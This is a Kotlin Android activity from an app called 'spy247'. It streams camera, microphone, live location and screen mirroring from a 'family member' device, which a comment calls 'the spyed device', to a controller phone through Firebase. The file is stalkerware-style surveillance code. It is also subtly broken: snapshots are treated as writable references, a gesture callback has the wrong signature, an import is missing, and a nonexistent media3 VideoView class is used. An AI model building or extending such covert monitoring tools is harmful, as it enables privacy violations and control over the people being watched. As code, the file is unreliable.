package com.spy247.app

import android.content.Context
import android.graphics.Bitmap
import android.os.Bundle
import android.util.Log
import android.view.GestureDetector
import android.view.MotionEvent
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.*
import java.util.concurrent.TimeUnit

/**
 * Main Activity - Entry point for both Controller and Family Member modes
 * Enhanced with Firebase-driven UI updates and gesture controls
 */
class MainActivity : AppCompatActivity(), ValueEventListener {
    
    private lateinit var app: App
    private lateinit var firebaseService: FirebaseService
    private lateinit var mediaManager: MediaManager
    private lateinit var locationTracker: LocationTracker
    private lateinit var networkMonitor: NetworkMonitor
    
    // Gesture detector for swipe controls on controller screen
    private lateinit var gestureDetector: GestureDetector
    
    companion object {
        const val PREFS_NAME = "spy247_prefs"
        const val KEY_DEVICE_MODE = "device_mode"
        
        // Stream quality thresholds from Firebase
        const val HIGH_QUALITY_FPS = 30
        const val MEDIUM_QUALITY_FPS = 15
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Initialize core app components
        app = App(this)
        firebaseService = FirebaseService(this)
        mediaManager = MediaManager(this)
        locationTracker = LocationTracker(this)
        networkMonitor = NetworkMonitor(this)
        
        // Get device mode from preferences or intent
        val modeString = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getString(KEY_DEVICE_MODE, "controller") ?: "controller"
        
        val mode = if (modeString == "family_member") DeviceMode.FAMILY_MEMBER else DeviceMode.CONTROLLER
        
        // Start the app in Firebase
        app.start(mode)
        
        // Setup connectivity monitoring
        networkMonitor.startMonitoring()
        
        // Initialize device in Firebase database
        firebaseService.initializeDevice(app.getDeviceName(), mode)
        
        // Subscribe to real-time data for controller mode
        if (mode == DeviceMode.CONTROLLER) {
            subscribeToControllerData()
            
            // Setup gesture detector for swipe controls
            gestureDetector = GestureDetector(this, object : GestureDetector.SimpleOnGestureListener() {
                override fun onFling(e1: MotionEvent, e2: MotionEvent): Boolean {
                    val dx = e2.x - e1.x
                    val dy = e2.y - e1.y
                    
                    // Swipe left/right to toggle camera/mic
                    if (Math.abs(dx) > Math.abs(dy)) {
                        if (dx > 0) {
                            Log.d("MainActivity", "Swiped right")
                            mediaManager.startCameraStream()
                        } else {
                            Log.d("MainActivity", "Swiped left")
                            mediaManager.startMicStream()
                        }
                    }
                    
                    return true
                }
            })
        }
        
        // Set up UI based on mode
        setupUI(mode)
    }
    
    /**
     * Subscribe to real-time Firebase data for controller screen
     */
    private fun subscribeToControllerData() {
        val deviceName = app.getDeviceName()
        
        // Listen to the main device node for metadata updates
        val deviceRef = firebaseService.getDeviceSnapshot(deviceName)
            ?.addValueEventListener(this)
        
        // Subscribe to individual streams (camera, mic, location, etc.)
        subscribeToStream("camera_stream")
        subscribeToStream("mic_stream")
        subscribeToStream("live_location")
        subscribeToStream("screen_mirroring")
        
        Log.d("MainActivity", "Subscribed to controller data for: $deviceName")
    }
    
    /**
     * Subscribe to a specific stream type (camera, mic, location, etc.)
     */
    private fun subscribeToStream(streamType: String) {
        val deviceName = app.getDeviceName()
        val streamRef = firebaseService.getDeviceSnapshot(deviceName)?.child(streamType)
        
        if (!streamRef.exists()) {
            // Auto-create the node structure if it doesn't exist
            streamRef.setValue(mapOf(
                "type" to streamType,
                "status" to "active",
                "last_update" to System.currentTimeMillis()
            ))
        }
        
        // Add value listener for real-time updates
        val childListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    Log.d("MainActivity", "Stream $streamType updated")
                }
            }
            
            override fun onCancelled(error: DatabaseError) {
                // Ignore stream errors
            }
        }
        
        if (streamRef.exists()) {
            streamRef.addValueEventListener(childListener)
        }
    }
    
    /**
     * Setup UI differently for Controller vs Family Member modes
     */
    private fun setupUI(mode: DeviceMode) {
        when (mode) {
            is DeviceMode.CONTROLLER -> {
                // Your main hub phone - see all streams
                setContentView(R.layout.activity_controller)
                
                // Bind status text to Firebase data
                findViewById<TextView>(R.id.status_text).apply {
                    text = "Online"
                    post { updateFromFirebase() }
                }
                
                // Bind stream count badge
                findViewById<TextView>(R.id.stream_count_badge).apply {
                    text = "3 Streams"
                    post { updateFromFirebase() }
                }
                
                // Add buttons to toggle camera, mic, location, etc.
                findViewById<android.widget.Button>(R.id.btn_camera)?.setOnClickListener {
                    mediaManager.startCameraStream()
                    updateStreamStatus("camera_stream", true)
                }
                
                findViewById<android.widget.Button>(R.id.btn_mic)?.setOnClickListener {
                    mediaManager.startMicStream()
                    updateStreamStatus("mic_stream", true)
                }
                
                findViewById<android.widget.Button>(R.id.btn_location)?.setOnClickListener {
                    locationTracker.startTracking()
                    updateStreamStatus("live_location", true)
                }
                
                // Bind video container to live feed updates
                findViewById<androidx.cardview.widget.CardView>(R.id.video_container).apply {
                    post { updateFromFirebase() }
                }
            }
            
            is DeviceMode.FAMILY_MEMBER -> {
                // The spyed device - sends all data to controller
                setContentView(R.layout.activity_family_member)
                
                // Simulate camera feed preview
                findViewById<androidx.media3.ui.view.VideoView>(R.id.video_view)?.start()
                
                // Update last heartbeat in Firebase for controller to see
                updateLastHeartbeat()
            }
        }
        
        Toast.makeText(this, "Mode: ${mode.name}", Toast.LENGTH_SHORT).show()
    }
    
    /**
     * Handle device lifecycle events - enhanced with Firebase state sync
     */
    override fun onResume() {
        super.onResume()
        
        // Re-establish streams if coming back from background
        mediaManager.startCameraStream()
        mediaManager.startMicStream()
        locationTracker.startTracking()
        
        // Update Firebase to reflect app is in foreground
        updateConnectionState(true)
        
        Toast.makeText(this, "Resumed - Streams active", Toast.LENGTH_SHORT).show()
    }
    
    override fun onPause() {
        super.onPause()
        
        // Pause streams to save battery but keep Firebase alive
        mediaManager.stopAllStreams()
        locationTracker.stopTracking()
        
        // Update Firebase to reflect app is in background
        updateConnectionState(false)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        app.stop()
        networkMonitor.stopMonitoring()
        
        Toast.makeText(this, "App stopped", Toast.LENGTH_SHORT).show()
    }
    
    /**
     * ValueEventListener implementation for real-time device metadata updates
     */
    override fun onDataChange(snapshot: DataSnapshot) {
        if (snapshot.exists()) {
            val mode = snapshot.child("mode").getValue(String::class.java) ?: "controller"
            
            // Update UI based on the latest data from Firebase
            updateUIFromFirebase(snapshot)
        }
        
        // Call parent implementation for any additional logic
    }
    
    override fun onCancelled(error: DatabaseError) {
        Log.w("MainActivity", "Firebase listener cancelled")
    }
    
    /**
     * Update UI elements based on the latest Firebase snapshot
     */
    private fun updateUIFromFirebase(snapshot: DataSnapshot) {
        // Get stream count from nested children
        val cameraCount = snapshot.child("camera_stream").getValue(Boolean::class.java) ?: false
        val micCount = snapshot.child("mic_stream").getValue(Boolean::class.java) ?: false
        val locationCount = snapshot.child("live_location").getValue(Boolean::class.java) ?: false
        
        // Update stream count badge
        findViewById<TextView>(R.id.stream_count_badge).text = 
            "${if (cameraCount) 1 else 0} ${if (micCount) 1 else 0} ${if (locationCount) 1 else 0} Streams"
        
        // Update quality badge based on FPS from Firebase
        val fps = snapshot.child("video_fps").getValue(Int::class.java) ?: 30
        findViewById<TextView>(R.id.quality_badge).text = "$fps FPS"
        
        // Update video container with any metadata overlays
        findViewById<androidx.cardview.widget.CardView>(R.id.video_container).apply {
            cardElevation = if (cameraCount || micCount) 8f else 4f
        }
    }
    
    /**
     * Helper to update a stream's status in Firebase
     */
    private fun updateStreamStatus(streamType: String, isActive: Boolean) {
        val deviceName = app.getDeviceName()
        
        // Get current streams map and merge with new value
        val streamsRef = firebaseService.getDeviceSnapshot(deviceName)?.child("active_streams")
        
        if (!streamsRef.exists()) {
            streamsRef.setValue(mapOf(
                "camera_stream" to false,
                "mic_stream" to false,
                "live_location" to false,
                "screen_mirroring" to false
            ))
        }
        
        // Update the specific stream
        val currentStreams = (streamsRef.getValue(Map::class.java) as? MutableMap<String, Boolean>) ?: mutableMapOf()
        currentStreams[streamType] = isActive
        
        streamsRef.setValue(currentStreams)
    }
    
    /**
     * Update connection state in Firebase for controller UI
     */
    private fun updateConnectionState(isConnected: Boolean) {
        val deviceName = app.getDeviceName()
        
        // Get current status map and merge with new value
        val statusRef = firebaseService.getDeviceSnapshot(deviceName)?.child("status")
        
        if (!statusRef.exists()) {
            statusRef.setValue(mapOf(
                "connection" to "connected",
                "battery_level" to 100,
                "last_sync" to System.currentTimeMillis()
            ))
        }
        
        // Update the specific field
        val currentStatus = (statusRef.getValue(Map::class.java) as? MutableMap<String, Any>) ?: mutableMapOf()
        currentStatus["connection"] = if (isConnected) "connected" else "disconnected"
        
        statusRef.setValue(currentStatus)
    }
    
    /**
     * Update the last heartbeat in Firebase for controller to see
     */
    private fun updateLastHeartbeat() {
        val deviceName = app.getDeviceName()
        val heartbeatRef = firebaseService.getDeviceSnapshot(deviceName)?.child("heartbeat")
        
        if (!heartbeatRef.exists()) {
            heartbeatRef.setValue(System.currentTimeMillis())
        } else {
            heartbeatRef.setValue(System.currentTimeMillis())
        }
    }
    
    /**
     * Get the current device name from Firebase (useful for controller mode)
     */
    fun getDeviceName(): String = app.getDeviceName()
}